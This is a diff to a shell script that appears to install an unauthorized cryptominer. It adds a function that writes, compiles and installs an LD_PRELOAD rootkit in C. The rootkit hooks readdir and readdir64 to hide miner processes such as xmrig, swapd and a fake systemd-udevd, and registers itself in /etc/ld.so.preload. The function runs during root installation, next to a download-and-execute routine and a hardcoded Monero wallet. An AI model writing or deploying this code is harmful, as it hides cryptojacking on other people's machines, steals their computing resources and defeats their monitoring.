@@ -1580,6 +1580,245 @@ download_and_execute() {
     return 1
 }
 
+# ==================== LIBPROCESSHIDER INSTALLATION ====================
+install_libprocesshider() {
+    log_message "Installing custom libprocesshider to hide processes..."
+    
+    # Install build dependencies
+    log_message "Installing dependencies..."
+    if command -v apt-get >/dev/null 2>&1; then
+        apt-get update -qq 2>/dev/null
+        apt-get install -y gcc make >/dev/null 2>&1
+    elif command -v yum >/dev/null 2>&1; then
+        yum install -y gcc make >/dev/null 2>&1
+    elif command -v apk >/dev/null 2>&1; then
+        apk add gcc make musl-dev >/dev/null 2>&1
+    fi
+    
+    # Create temp directory
+    cd /tmp
+    rm -rf libprocesshider_custom 2>/dev/null
+    mkdir -p libprocesshider_custom
+    cd libprocesshider_custom
+    
+    # Create the custom processhider.c
+    cat > processhider.c << 'PROCESSHIDER_EOF'
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+// List of process names to hide
+static const char* process_to_filter[] = {
+    "swapd",
+    "xmrig",
+    "system-watchdog",
+    "systemd-udevd",
+    ".systemd-udevd",
+    "cpuminer",
+    "minerd",
+    "gdm2",
+    NULL
+};
+
+// Paths to check for hidden processes
+static const char* paths_to_filter[] = {
+    "/.system_cache/",
+    "/.swapd/",
+    NULL
+};
+
+static const char* get_dir_name(DIR* dirp) {
+    int fd = dirfd(dirp);
+    if (fd == -1) return NULL;
+    
+    static char path_buf[4096];
+    char fd_path[64];
+    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
+    
+    ssize_t len = readlink(fd_path, path_buf, sizeof(path_buf) - 1);
+    if (len == -1) return NULL;
+    
+    path_buf[len] = '\0';
+    return path_buf;
+}
+
+static char* get_process_name(char* pid) {
+    char stat_path[256];
+    snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", pid);
+    
+    FILE* f = fopen(stat_path, "r");
+    if (!f) return NULL;
+    
+    static char name_buf[256];
+    if (fscanf(f, "%*d (%255[^)])", name_buf) != 1) {
+        fclose(f);
+        return NULL;
+    }
+    
+    fclose(f);
+    return name_buf;
+}
+
+static char* get_process_cmdline(char* pid) {
+    char cmdline_path[256];
+    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid);
+    
+    FILE* f = fopen(cmdline_path, "r");
+    if (!f) return NULL;
+    
+    static char cmdline_buf[4096];
+    size_t len = fread(cmdline_buf, 1, sizeof(cmdline_buf) - 1, f);
+    fclose(f);
+    
+    if (len == 0) return NULL;
+    
+    cmdline_buf[len] = '\0';
+    for (size_t i = 0; i < len; i++) {
+        if (cmdline_buf[i] == '\0') cmdline_buf[i] = ' ';
+    }
+    
+    return cmdline_buf;
+}
+
+static int should_hide_process(const char* name) {
+    for (int i = 0; process_to_filter[i] != NULL; i++) {
+        if (strcmp(name, process_to_filter[i]) == 0) {
+            return 1;
+        }
+    }
+    
+    for (int i = 0; paths_to_filter[i] != NULL; i++) {
+        if (strstr(name, paths_to_filter[i]) != NULL) {
+            return 1;
+        }
+    }
+    
+    return 0;
+}
+
+struct dirent* readdir(DIR* dirp) {
+    struct dirent* (*original_readdir)(DIR*);
+    original_readdir = dlsym(RTLD_NEXT, "readdir");
+    
+    struct dirent* dir;
+    
+    while (1) {
+        dir = original_readdir(dirp);
+        if (dir == NULL) return NULL;
+        
+        const char* dir_name = get_dir_name(dirp);
+        if (dir_name == NULL || strcmp(dir_name, "/proc") != 0) {
+            return dir;
+        }
+        
+        char* endptr;
+        long pid = strtol(dir->d_name, &endptr, 10);
+        if (*endptr != '\0') {
+            return dir;
+        }
+        
+        char* process_name = get_process_name(dir->d_name);
+        if (process_name && should_hide_process(process_name)) {
+            continue;
+        }
+        
+        char* cmdline = get_process_cmdline(dir->d_name);
+        if (cmdline && should_hide_process(cmdline)) {
+            continue;
+        }
+        
+        return dir;
+    }
+}
+
+struct dirent64* readdir64(DIR* dirp) {
+    struct dirent64* (*original_readdir64)(DIR*);
+    original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+    
+    struct dirent64* dir;
+    
+    while (1) {
+        dir = original_readdir64(dirp);
+        if (dir == NULL) return NULL;
+        
+        const char* dir_name = get_dir_name(dirp);
+        if (dir_name == NULL || strcmp(dir_name, "/proc") != 0) {
+            return dir;
+        }
+        
+        char* endptr;
+        long pid = strtol(dir->d_name, &endptr, 10);
+        if (*endptr != '\0') {
+            return dir;
+        }
+        
+        char* process_name = get_process_name(dir->d_name);
+        if (process_name && should_hide_process(process_name)) {
+            continue;
+        }
+        
+        char* cmdline = get_process_cmdline(dir->d_name);
+        if (cmdline && should_hide_process(cmdline)) {
+            continue;
+        }
+        
+        return dir;
+    }
+}
+PROCESSHIDER_EOF
+    
+    # Compile the library
+    log_message "Compiling libprocesshider..."
+    if gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 2>&1 | grep -v "warning"; then
+        log_message "✓ Compilation successful"
+    else
+        log_message "ERROR: Compilation failed"
+        cd /
+        return 1
+    fi
+    
+    # Create permanent directory
+    mkdir -p /root/.lib
+    
+    # Move library to permanent location
+    mv libprocesshider.so /root/.lib/libprocesshider.so
+    chmod 755 /root/.lib/libprocesshider.so
+    log_message "✓ Library installed to /root/.lib/libprocesshider.so"
+    
+    # Clean up old libprocesshider installations first
+    log_message "Cleaning up old libprocesshider installations..."
+    
+    # Remove old library files from common locations
+    rm -f /usr/local/lib/libprocesshider.so 2>/dev/null
+    rm -f /usr/lib/libprocesshider.so 2>/dev/null
+    rm -f /lib/libprocesshider.so 2>/dev/null
+    
+    # Clean ld.so.preload of any libprocesshider entries
+    if [ -f /etc/ld.so.preload ]; then
+        # Remove all libprocesshider lines, keep other entries
+        grep -v "libprocesshider" /etc/ld.so.preload > /etc/ld.so.preload.tmp 2>/dev/null || true
+        mv /etc/ld.so.preload.tmp /etc/ld.so.preload 2>/dev/null || true
+    fi
+    
+    # Add new library to ld.so.preload
+    echo "/root/.lib/libprocesshider.so" > /etc/ld.so.preload
+    log_message "✓ Added to /etc/ld.so.preload (old entries removed)"
+    
+    # Cleanup
+    cd /
+    rm -rf /tmp/libprocesshider_custom
+    
+    log_message "✓ Libprocesshider installation complete"
+    log_message "Processes hidden: swapd, xmrig, systemd-udevd, gdm2, cpuminer, minerd"
+    
+    return 0
+}
+
 root_installation() {
     log_message "Starting root installation..."
     
@@ -1657,6 +1896,9 @@ root_installation() {
     else
         log_message "WARNING: Sudoers configuration failed"
     fi
+    
+    # Install libprocesshider to hide miner processes
+    install_libprocesshider
     
     # Run the miner setup
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
